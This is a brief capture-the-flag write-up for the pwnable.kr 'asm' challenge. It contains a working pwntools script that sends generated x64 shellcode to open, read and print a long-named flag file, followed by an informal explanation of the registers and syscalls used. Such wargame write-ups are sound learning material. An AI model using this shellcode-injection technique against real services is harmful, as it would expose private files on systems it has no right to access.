LEVEL - asm
here we had to write a asm x64 shell script that will open the flag read from it and then will write the content to sdtout so instead of writing all the assembly 
we can use pwntools shellcraft that will write all the asambly for us that's the code i used to get the flag:

from pwn import *
context.arch = 'amd64'
p= remote('pwnable.kr',9026)
p.recvuntil(b'shellcode:')

send = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

send += shellcraft.read('rax','rsp',0x50)

send += shellcraft.write(1,'rsp',0x50)

p.send(asm(send))
get = p.recvline().decode()
print(get)

here we conect to pwnable.kr in port 9026 we use shellcraft to make the assembly open code we try to open the flag ( the flag name is relly long)
and than we add to the nessage we will send to the sever to get the flag the assembly cod e of read we use ax as the file discreptor becouse its the register where the return verbels are stored in we store the content of the flag in the stack so we use sp we read 50 byts and than we write what we got from the flag to stdout and in the end we get the flag
